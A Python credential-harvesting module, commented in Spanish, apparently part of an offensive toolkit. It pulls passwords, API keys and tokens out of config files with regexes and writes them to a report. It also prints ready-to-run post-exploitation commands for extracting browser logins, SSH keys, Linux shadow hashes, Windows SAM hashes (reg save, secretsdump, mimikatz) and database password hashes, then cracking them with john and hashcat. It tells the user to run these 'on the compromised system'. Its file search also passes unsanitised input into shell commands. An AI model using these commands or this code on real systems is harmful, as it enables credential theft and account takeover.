#!/usr/bin/env python3
"""
Módulo de Credential Harvesting
Búsqueda y extracción de credenciales
"""

import os
import re
from pathlib import Path
from utils import (
    print_banner, print_success, print_error, print_info, print_warning,
    run_command, save_output, log_action, get_timestamp, print_table
)
from config import Config


class CredentialHarvester:
    """Harvester de credenciales y secretos"""
    
    def __init__(self, target):
        self.target = target
        self.credentials = []
        self.secrets = []
        self.hashes = []
    
    def search_in_files(self, directory, patterns):
        """Busca patrones en archivos"""
        findings = []
        
        for pattern_name, regex in patterns.items():
            print_info(f"Buscando {pattern_name}...")
            
            # Usar grep/findstr para buscar
            if os.name == 'posix':  # Linux/Mac
                cmd = f"grep -r -i -E '{regex}' {directory} 2>/dev/null"
            else:  # Windows
                cmd = f'findstr /S /I /R "{regex}" "{directory}\\*" 2>nul'
            
            exit_code, stdout, stderr = run_command(cmd, timeout=120)
            
            if stdout:
                findings.append({
                    'type': pattern_name,
                    'matches': stdout.strip().split('\n')[:10]  # Top 10
                })
        
        return findings
    
    def extract_from_config_files(self, config_dir):
        """Extrae credenciales de archivos de configuración comunes"""
        print_info("Extrayendo credenciales de archivos de configuración...")
        
        config_files = [
            'web.config',
            'app.config',
            'config.php',
            'database.yml',
            '.env',
            'settings.py',
            'application.properties',
            'wp-config.php',
            'config.json',
            'config.xml'
        ]
        
        patterns = {
            'password': r'password["\']?\s*[:=]\s*["\']?([^"\';\s]+)',
            'api_key': r'api[_-]?key["\']?\s*[:=]\s*["\']?([^"\';\s]+)',
            'secret': r'secret["\']?\s*[:=]\s*["\']?([^"\';\s]+)',
            'token': r'token["\']?\s*[:=]\s*["\']?([^"\';\s]+)',
            'database': r'(mysql|postgres|mongodb)://([^@]+)@',
        }
        
        for config_file in config_files:
            filepath = Path(config_dir) / config_file
            if filepath.exists():
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()
                    
                    for cred_type, pattern in patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                self.credentials.append({
                                    'type': cred_type,
                                    'value': match,
                                    'source': config_file
                                })
    
    def extract_browser_credentials(self):
        """Guía para extraer credenciales de navegadores"""
        print_info("\n📱 Extracción de Credenciales de Navegadores")
        
        print_warning("\n=== LINUX ===")
        print("# Google Chrome")
        print("  ~/.config/google-chrome/Default/Login Data")
        print("  sqlite3 'Login Data' 'SELECT * FROM logins'")
        
        print("\n# Firefox")
        print("  ~/.mozilla/firefox/*.default-release/logins.json")
        print("  firefox_decrypt para descifrar")
        
        print_warning("\n=== WINDOWS ===")
        print("# Chrome")
        print("  %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data")
        print("  ChromePass / LaZagne para extraer")
        
        print("\n# Firefox")
        print("  %APPDATA%\\Mozilla\\Firefox\\Profiles\\")
        print("  firefox_decrypt.py")
        
        print_info("\n🔧 Herramientas Recomendadas:")
        print("  • LaZagne: https://github.com/AlessandroZ/LaZagne")
        print("  • firefox_decrypt: https://github.com/unode/firefox_decrypt")
        print("  • mimikatz (Windows)")
    
    def extract_ssh_keys(self):
        """Guía para extraer claves SSH"""
        print_info("\n🔑 Extracción de Claves SSH")
        
        print_warning("\nComandos para buscar claves privadas:")
        print("# Linux")
        print("  find / -name id_rsa 2>/dev/null")
        print("  find / -name id_dsa 2>/dev/null")
        print("  find ~/.ssh/ -type f 2>/dev/null")
        
        print("\n# Windows")
        print("  dir /s /b C:\\Users\\*id_rsa*")
        print("  dir /s /b %USERPROFILE%\\.ssh\\*")
        
        print_info("\nSi encuentras claves:")
        print("  1. Copiar la clave privada")
        print("  2. chmod 600 id_rsa")
        print("  3. ssh -i id_rsa user@target")
        
        print_warning("\nCrackear passphrase (si tiene):")
        print("  ssh2john id_rsa > hash.txt")
        print("  john --wordlist=rockyou.txt hash.txt")
    
    def extract_password_hashes(self):
        """Guía para extraer hashes de contraseñas"""
        print_info("\n🔐 Extracción de Hashes de Contraseñas")
        
        print_warning("\n=== LINUX ===")
        print("# Archivos importantes:")
        print("  /etc/passwd  # Usuarios del sistema")
        print("  /etc/shadow  # Hashes de contraseñas (requiere root)")
        
        print("\n# Extraer y preparar para crackeo:")
        print("  unshadow /etc/passwd /etc/shadow > hashes.txt")
        print("  john --wordlist=rockyou.txt hashes.txt")
        print("  hashcat -m 1800 hashes.txt rockyou.txt")
        
        print_warning("\n=== WINDOWS ===")
        print("# Método 1: SAM database")
        print("  reg save HKLM\\SAM sam.hive")
        print("  reg save HKLM\\SYSTEM system.hive")
        print("  impacket-secretsdump -sam sam.hive -system system.hive LOCAL")
        
        print("\n# Método 2: Mimikatz (in memory)")
        print("  privilege::debug")
        print("  sekurlsa::logonpasswords")
        print("  lsadump::sam")
        
        print("\n# Crackeo de NTLM hashes:")
        print("  hashcat -m 1000 ntlm.txt rockyou.txt")
        print("  john --format=NT ntlm.txt")
    
    def search_database_credentials(self):
        """Guía para buscar credenciales en bases de datos"""
        print_info("\n🗄️  Extracción de Credenciales de Bases de Datos")
        
        print_warning("\n=== MySQL/MariaDB ===")
        print("# Dump de usuarios:")
        print("  SELECT user, password FROM mysql.user;")
        print("  SELECT user, authentication_string FROM mysql.user;")
        
        print("\n# Archivos de configuración:")
        print("  /etc/mysql/my.cnf")
        print("  ~/.my.cnf")
        
        print_warning("\n=== PostgreSQL ===")
        print("# Usuarios:")
        print("  SELECT usename, passwd FROM pg_shadow;")
        print("  \\du  # listar usuarios")
        
        print_warning("\n=== MongoDB ===")
        print("# Dump de usuarios:")
        print("  use admin")
        print("  db.system.users.find()")
        
        print_warning("\n=== MSSQL ===")
        print("# Usuarios y hashes:")
        print("  SELECT name, password_hash FROM sys.sql_logins;")
    
    def display_credentials(self):
        """Muestra las credenciales encontradas"""
        if self.credentials:
            print_success("\n✅ Credenciales Encontradas:")
            
            headers = ["Tipo", "Valor", "Origen"]
            rows = [
                [cred['type'], cred['value'][:50], cred.get('source', 'N/A')]
                for cred in self.credentials[:20]  # Top 20
            ]
            
            print_table(headers, rows)
        else:
            print_warning("No se encontraron credenciales en el análisis automático")
    
    def generate_report(self, output_dir):
        """Genera reporte de credenciales"""
        report = f"""# Reporte de Credential Harvesting - {self.target}
Fecha: {get_timestamp()}

## Credenciales Encontradas

Total: {len(self.credentials)}

"""
        for cred in self.credentials:
            report += f"- **{cred['type']}**: `{cred['value']}`\n"
            if 'source' in cred:
                report += f"  Source: {cred['source']}\n"
            report += "\n"
        
        save_output(self.target, "credentials", f"credentials_{get_timestamp()}.md", report)


def run_credential_harvest(args):
    """
    Función principal del módulo de credential harvesting
    
    Args:
        args: Argumentos parseados
    """
    print_info(f"Credential harvesting: {args.target}")
    
    print_warning("\n╔════════════════════════════════════════════════════════╗")
    print_warning("║  ADVERTENCIA: Uso en sistemas autorizados únicamente  ║")
    print_warning("╚════════════════════════════════════════════════════════╝\n")
    
    harvester = CredentialHarvester(args.target)
    output_dir = Config.get_output_dir(args.target)
    
    log_action(args.target, "credentials", "Iniciando credential harvesting")
    
    # Mostrar guías
    harvester.extract_browser_credentials()
    harvester.extract_ssh_keys()
    harvester.extract_password_hashes()
    harvester.search_database_credentials()
    
    # Si se especifica directorio, buscar
    if hasattr(args, 'directory') and args.directory:
        patterns = {
            'passwords': r'password|passwd|pwd',
            'api_keys': r'api_key|apikey',
            'tokens': r'token|auth|jwt',
        }
        findings = harvester.search_in_files(args.directory, patterns)
        
        for finding in findings:
            print_info(f"\n{finding['type']}:")
            for match in finding['matches']:
                print(f"  {match}")
    
    # Generar reporte
    harvester.generate_report(output_dir)
    
    print_success("Credential harvesting completado")
    print_info(f"Revisa las guías y ejecuta los comandos en el sistema comprometido")
    
    log_action(args.target, "credentials", "Credential harvesting completado")
